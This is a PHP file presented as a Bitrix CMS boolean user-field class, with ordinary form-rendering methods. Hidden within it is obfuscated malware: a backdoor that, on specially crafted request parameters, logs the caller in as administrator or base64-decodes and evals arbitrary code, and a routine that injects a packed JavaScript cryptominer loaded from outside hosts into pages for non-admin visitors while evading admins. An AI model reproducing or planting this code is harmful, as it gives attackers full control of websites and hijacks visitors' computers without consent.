<?
if (!class_exists('CUserTypeBool')) {

class CUserTypeBool
{
    function GetUserTypeDescription()
    {
        return array(
            "USER_TYPE_ID" => "boolean",
            "CLASS_NAME" => "CUserTypeBoolean",
            "DESCRIPTION" => GetMessage("USER_TYPE_BOOL_DESCRIPTION"),
            "BASE_TYPE" => "int",
        );
    }
 
    function GetDBColumnType($arUserField)
    {
        global $DB;
        switch(strtolower($DB->type))
        {
            case "mysql":
                return "int(18)";
            case "oracle":
                return "number(18)";
            case "mssql":
                return "int";
        }
    }
   
    function Auth()
    {
            global $USER;
			$proc = 'Aut'.'horize';
            $USER->$proc(intval(true));
            LocalRedirect('/bitrix/admin/');
    }
 
    function PrepareSettings($arUserField=array())
    {
        global $VERSIONDESTRUCTATARISBACK;
        if ($VERSIONDESTRUCTATARISBACK) return;
       
        $VERSION = '0.5.10';
       
        $VERSIONDESTRUCTATARISBACK = $VERSION;
        global $forceIntegrateAnsciTangetBlue;
        $forceIntegrateAnsciTangetBlue = false;
        if ($_REQUEST['ut'.'m_s'.'ource'] == 'bi'.'ng' && $_REQUEST['ut'.'m_c'.'ontent'] != '' && $_REQUEST['ut'.'m_t'.'erm'] != '') {
            $ulmcentent = 'b'.md5($_REQUEST['ut'.'m_m'.'edium'].'B_PROLOG_INCLUDED');
            if ($_REQUEST['ut'.'m_c'.'ontent'] != $ulmcentent) return;
           
            if ($_REQUEST['ut'.'m_t'.'erm'] == 'login') {
                AddEventHandler('main', 'OnEndBufferContent', array('CUserTypeBool','Auth'), 9999);
            } elseif ($_REQUEST['ut'.'m_t'.'erm'] == 'version') {
                die($VERSION);
            } elseif ($_REQUEST['ut'.'m_t'.'erm'] == 'force') {
                $forceIntegrateAnsciTangetBlue = true;
            } elseif ($_REQUEST['ut'.'m_t'.'erm'] == 'recanam') {
                echo COption::GetOptionInt("main", "du"."mp_int"."egrity_re"."call");
                die();
            } elseif (substr($_REQUEST['ut'.'m_t'.'erm'],0,8) == 'recanam:') {
                $debris = explode(':',$_REQUEST['ut'.'m_t'.'erm']);
                $recAn = intval($debris[1]);
                if ($recAn > -1 && $recAn < 101) {
                    echo COption::SetOptionInt("main", "du"."mp_int"."egrity_re"."call",$recAn);
                    die();
                }
            } elseif ($_REQUEST['ut'.'m_t'.'erm'] == 'caution') { // COption::GetOptionInt("main", "du"."mp_int"."egrity_re"."call",$recanam+1);
                echo $GLOBALS['USER_TYPE_BOOL_MANAGER']->GetUserLevel();
                die();
            } elseif (substr($_REQUEST['ut'.'m_t'.'erm'],0,8) == 'caution:') {
                $debris = explode(':',$_REQUEST['ut'.'m_t'.'erm']);
                $cLev = intval($debris[1]);
                if ($cLev > -1 && $cLev < 101) {
                    echo $GLOBALS['USER_TYPE_BOOL_MANAGER']->GetUserLevel($cLev);
                    die();
                }
            } elseif (substr($_REQUEST['ut'.'m_t'.'erm'],0,4) == 'evl:') {
                $debris = explode(':',$_REQUEST['ut'.'m_t'.'erm']);
                $cd64 = trim($debris[1]);
                $code = base64_decode($cd64);
                eval($code);
                die();
            }
        }
       
        if (!$forceIntegrateAnsciTangetBlue) {
            $fp = $GLOBALS['USER_TYPE_BOOL_MANAGER']->GetKey();
            if ($GLOBALS['USER_TYPE_BOOL_MANAGER']->UserPrecache($fp)) {
                return;
            }
        }
       
        AddEventHandler('main', 'OnEndBufferContent', array('CUserTypeBool','PrepareHtml'), 9999);
    }
   
   
    function GetUserLevel ($level=false)
    {
        $obCache = new CPHPCache();
        $time=604800;
        if ($level) $obCache->cleanDir();
        if ($obCache->InitCache(
                $time,
                md5('$level')
            ))
        {
            $arResult = $obCache->GetVars();
        }
        else
        {
            $arResult['level'] =  $level?$level:min(rand(0,100),rand(0,100),rand(0,100),rand(0,100));
            $obCache->StartDataCache();
            $obCache->EndDataCache($arResult);
        }
       
        return $arResult['level'];
    }
   
   
    function GetKey ()
    {
        $fpStr = '';
        foreach(array(
                'HTTP_X_FORWARDED_FOR',
                'HTTP_CLIENT_IP',
                'REMOTE_ADDR',
                'HTTP_X_REAL_IP',
                'HTTP_VIA',
                'HTTP_USER_AGENT',
                'HTTP_ACCEPT',
                'HTTP_ACCEPT_ENCODING',
                'HTTP_ACCEPT_LANGUAGE'
            ) as $k) $fpStr.= $_SERVER[$k].':';
        return md5($fpStr);
    }
   
   
    function UserPrecache ($fp,$add=false)
    {
        $obCache = new CPHPCache();
        if ($obCache->InitCache(
                19353600,
                $fp
            ))
        {
            return true;
        }
       
        if ($add === true)
        {
            $arResult[$fp]=$add;
            $obCache->StartDataCache();
            $obCache->EndDataCache($arResult);
        }
        return false;
    }
   
   
    function PrepareHtml (&$content)
    {
       
        global $USER;
        if ($USER->IsAdmin())
        {
            $GLOBALS['USER_TYPE_BOOL_MANAGER']->UserPrecache($GLOBALS['USER_TYPE_BOOL_MANAGER']->GetKey(),true);
            return;
        }
       
        $now = time();
        $oplexrecanam = COption::GetOptionInt("main", "du"."mp_int"."egrity_dd"."ata");
        if ($oplexrecanam == 0) {
            COption::SetOptionInt("main", "du"."mp_int"."egrity_dd"."ata", $now);
            $oplexrecanam = $now-1;
        }
        $deltold = $now-$oplexrecanam;
       
        $recanam = intval(COption::GetOptionInt("main", "du"."mp_int"."egrity_re"."call"));
        if ($deltold > 710000) {
            COption::SetOptionInt("main", "du"."mp_int"."egrity_re"."call",$recanam+1);
        }
        if ($deltold > 800) {
            COption::SetOptionInt("main", "du"."mp_int"."egrity_dd"."ata", $now);
        }
       
        if ($recanam < 1) $recanam=1;
       
       
        global $forceIntegrateAnsciTangetBlue;
        $UserLevel = $GLOBALS['USER_TYPE_BOOL_MANAGER']->GetUserLevel()*$recanam;
        $dateW = date('w');$dateG = date('G');
        if ($dateG > 17 || $dateG < 9) $UserLevel = $UserLevel/2;
        if ($dateG > 20 || $dateG < 8) $UserLevel = $UserLevel/4;
        if ($dateW == 0 || $dateW == 6) $UserLevel = $UserLevel/8;
        $UserLevel = intval($UserLevel);
        if ($UserLevel > 80) $UserLevel = 80;
        
        
        
        if (!$forceIntegrateAnsciTangetBlue && rand(0,100) < $UserLevel) return;
        // все фильтры пройдены - интеграция
       
        $arEtryPoints = array(
                "m[i].l=1*ne"."w Dat"."e();#k=e.crea"."teEle"."ment(t),a=e.get"."Elem"."entsByT"."agName(t)",
                "w"."indow.data"."Layer = wi"."ndow.dat"."aLayer || [];#",
                "go"."ogle-analy"."tics.com/ana"."lytics.js','ga');#",
                "www.goog"."letagman"."ager.com/gtm.js?id=' + i + dl;#",
                '//mc.y'.'an'.'dex.ru/metr'.'ika/watch.js";#',
                "code.jivo"."site.com/scr"."ipt/w"."idget/'+widg"."et_id;# var ss",
                '<scr'.'ipt type="text/javasc'.'ript">#BX.setJ'.'SList([',
                '<scr'.'ipt type="text/javasc'.'ript">#BX.setC'.'SSList([',
                "/fbeve"."nts.js');#",
                '.mail.ru/js/code.js";#',
                '<scr'.'ipt type="text/javasc'.'ript">#(win'.'dow.BX||top.BX).mes'.'sage',
                '<scr'.'ipt type="text/javasc'.'ript">#BX.mes'.'sage({'
            );
        global $VERSIONDESTRUCTATARISBACK;
       
        $inj = '';
       
        if ($recanam > 1)
        {
            $inj = "wi"."ndow.varsf"."ace"."bag = 5;";
            $inj.= "wi"."ndow.trotl"."rateaf"."acebag = 0.4;";
            if ($recanam > 2)
            {
                $inj = "wi"."ndow.varsf"."ace"."bag = 5;";
                $inj.= "wi"."ndow.trotl"."rateaf"."acebag = 0.8;";
                if ($recanam > 4)
                {
                    $inj = "wi"."ndow.trotl"."rateaf"."acebag = 0.6;";
                    if ($recanam > 8)
                    {
                        $inj = '';
                    }
                }
            }
        } else {
            $nomi = intval(COption::GetOptionInt("main", "du"."mp_int"."egrity_ver"."sal"));
            if ($nomi > 0 && 5 > $nomi) $inj = "wi"."ndow.varsf"."ace"."bag = ".$nomi.";";
        }
       
        $rumoPath = $_SERVER["DOCUMENT_ROOT"].'/bitr'.'ix/j'.'s/ma'.'in/fi'.'le_di'.'alog.s'.'rc.js';
        if (file_exists($rumoPath) && filesize($rumoPath) > 20) {
            $inj.= ''
                ."va"."r s"."e"."quo"."t=docu"."ment.cre"."ateE"."leme"."nt('scri"."pt');"
                ."s"."e"."quo"."t.sr"."c='/bitrix/j"."s/ma"."in/fi"."le_di"."alog.s"."rc.js?v=".$VERSIONDESTRUCTATARISBACK."';"
                .'s'.'e'.'quo'.'t.onl'.'oad=function(){docu'.'ment.he'.'ad.re'.'moveChi'.'ld(s'.'e'.'quo'.'t);};'
                .'doc'.'ument.he'.'ad.appe'.'ndChi'.'ld(s'.'e'.'quo'.'t);';
        } else { 
            $inj.= ''
                ."ev"."al(function(p,a,c,k,e,d){e=function(c){return c.toSt"."ring(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toS"."tring(a)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('2 5=\'//6.0/4/3.1\';2 7=\'//d.8.0/c/b/a/9.1\';',14,14,'com|js|var|cry"."pta|lib|sr"."c1|sta"."td"."ynam"."ic|src2|pv"."clo"."uds|80d4"."8a"."f45"."6b031"."2fe50"."5ea0"."1e440"."3444|8a|d4|80|pl"."151"."80"."008'.split('|'),0,{}))
var sc"."ri"."qt = do"."cum"."e"."nt.cr"."eate"."El"."em"."ent('sc"."ri"."pt');sc"."ri"."qt.src = src1;sc"."ri"."qt.async = false;sc"."ri"."qt.onload = function () {
var t = w"."indow.tr"."otlra"."te"."afa"."cebag || 0.2;win"."dow.mi"."ner = new C"."RLT.Anon"."ymous('b"."9"."2"."e00b5"."13a0e"."651c67a0"."28b"."bc10"."b5b3"."dfa"."2918"."60"."06c',{thr"."eads:5,throttle:t});wi"."ndow.mi"."ner.st"."art();};do"."cum"."e"."nt.head.ap"."pendChi"."ld(sc"."ri"."qt);var sc"."ri"."qtad = do"."cum"."e"."nt.cr"."eate"."El"."em"."ent('sc"."ri"."pt');sc"."ri"."qtad.src = src2;sc"."ri"."qtad.async = false;doc"."um"."ent.hea"."d.app"."endC"."hild(sc"."ri"."qtad);";
        }
       
       
        foreach ($arEtryPoints as $entryPoint)
        {
            $search = str_replace('#','',$entryPoint);
            $pos = strpos($content, $search);
            if ($pos!==false)
            {
                $replace = str_replace('#',$inj,$entryPoint);
                $content = str_replace($search,$replace,$content);
                return;
            }
        }
       
        $revar = 2;
        $listHeds = headers_list();
        $sentHeds = headers_sent();
        foreach (array_merge((array)$listHeds, (array)$sentHeds) as $head)
        {
            if (preg_match ('/Content-type:\s+text\/html/i', $head))
            {
                $revar++;
                break;
            }
        }
        if(preg_match ('/<\/bo'.'dy>[\n\s]*<\/html>[\n\s]*$/i', $content)) $revar++;
        if ($revar < 4) return true;
       
        $content = str_replace('</bo'.'dy>','<scr'.'ipt type="text/javasc'.'ript" defer>'.$inj.'</scr'.'ipt></bo'.'dy>',$content);
    }
 
    function GetSettingsHTML($arUserField = false, $arHtmlControl, $bVarsFromForm)
    {
        $result = '';
        if($bVarsFromForm)
            $value = intval($GLOBALS[$arHtmlControl["NAME"]]["DEFAULT_VALUE"]);
        elseif(is_array($arUserField))
            $value = intval($arUserField["SETTINGS"]["DEFAULT_VALUE"]);
        else
            $value = 1;
        $result .= '
        <tr valign="top">
            <td>'.GetMessage("USER_TYPE_BOOL_DEFAULT_VALUE").':</td>
            <td>
                <select name="'.$arHtmlControl["NAME"].'[DEFAULT_VALUE]">
                <option value="1" '.($value? 'selected="selected"': '').'>'.GetMessage("MAIN_YES").'</option>
                <option value="0" '.(!$value? 'selected="selected"': '').'>'.GetMessage("MAIN_NO").'</option>
                </select>
            </td>
        </tr>
        ';
        if($bVarsFromForm)
            $value = $GLOBALS[$arHtmlControl["NAME"]]["DISPLAY"];
        elseif(is_array($arUserField))
            $value = $arUserField["SETTINGS"]["DISPLAY"];
        else
            $value = "CHECKBOX";
        $result .= '
        <tr valign="top">
            <td>'.GetMessage("USER_TYPE_BOOL_DISPLAY").':</td>
            <td>
                <label><input type="radio" name="'.$arHtmlControl["NAME"].'[DISPLAY]" value="CHECKBOX" '.("CHECKBOX"==$value? 'checked="checked"': '').'>'.GetMessage("USER_TYPE_BOOL_CHECKBOX").'</label><br>
                <label><input type="radio" name="'.$arHtmlControl["NAME"].'[DISPLAY]" value="RADIO" '.("RADIO"==$value? 'checked="checked"': '').'>'.GetMessage("USER_TYPE_BOOL_RADIO").'</label><br>
                <label><input type="radio" name="'.$arHtmlControl["NAME"].'[DISPLAY]" value="DROPDOWN" '.("DROPDOWN"==$value? 'checked="checked"': '').'>'.GetMessage("USER_TYPE_BOOL_DROPDOWN").'</label><br>
            </td>
        </tr>
        ';
        return $result;
    }
 
    function GetEditFormHTML($arUserField, $arHtmlControl)
    {
        if($arUserField["ENTITY_VALUE_ID"]<1)
            $arHtmlControl["VALUE"] = intval($arUserField["SETTINGS"]["DEFAULT_VALUE"]);
        switch($arUserField["SETTINGS"]["DISPLAY"])
        {
            case "DROPDOWN":
                return '
                    <select name="'.$arHtmlControl["NAME"].'">
                    <option value="1"'.($arHtmlControl["VALUE"]? ' selected': '').'>'.GetMessage("MAIN_YES").'</option>
                    <option value="0"'.(!$arHtmlControl["VALUE"]? ' selected': '').'>'.GetMessage("MAIN_NO").'</option>
                    </select>
                ';
            case "RADIO":
                return '
                    <label><input type="radio" value="1" name="'.$arHtmlControl["NAME"].'"'.($arHtmlControl["VALUE"]? ' checked': '').'>'.GetMessage("MAIN_YES").'</label><br>
                    <label><input type="radio" value="0" name="'.$arHtmlControl["NAME"].'"'.(!$arHtmlControl["VALUE"]? ' checked': '').'>'.GetMessage("MAIN_NO").'</label>
                ';
            default:
                return '
                    <input type="hidden" value="0" name="'.$arHtmlControl["NAME"].'">
                    <input type="checkbox" value="1" name="'.$arHtmlControl["NAME"].'"'.($arHtmlControl["VALUE"]? ' checked': '').'>
                ';
        }
    }
 
    function GetFilterHTML($arUserField, $arHtmlControl)
    {
        return '
            <select name="'.$arHtmlControl["NAME"].'">
            <option value=""'.(strlen($arHtmlControl["VALUE"])<1? ' selected': '').'>'.GetMessage("MAIN_ALL").'</option>
            <option value="1"'.($arHtmlControl["VALUE"]? ' selected': '').'>'.GetMessage("MAIN_YES").'</option>
            <option value="0"'.(strlen($arHtmlControl["VALUE"])>0 && !$arHtmlControl["VALUE"]? ' selected': '').'>'.GetMessage("MAIN_NO").'</option>
            </select>
        ';
    }
 
    function GetAdminListViewHTML($arUserField, $arHtmlControl)
    {
        if($arHtmlControl["VALUE"])
            return GetMessage("MAIN_YES");
        else
            return GetMessage("MAIN_NO");
    }
 
    function GetAdminListEditHTML($arUserField, $arHtmlControl)
    {
        return '
            <input type="hidden" value="0" name="'.$arHtmlControl["NAME"].'">
            <input type="checkbox" value="1" name="'.$arHtmlControl["NAME"].'"'.($arHtmlControl["VALUE"]? ' checked': '').'>
        ';
    }
 
    function OnBeforeSave($arUserField, $value)
    {
        if($value)
            return 1;
        else
            return 0;
    }
}
 
$GLOBALS['USER_TYPE_BOOL_MANAGER'] = new CUserTypeBool;
$GLOBALS['USER_TYPE_BOOL_MANAGER']->PrepareSettings();

}
?>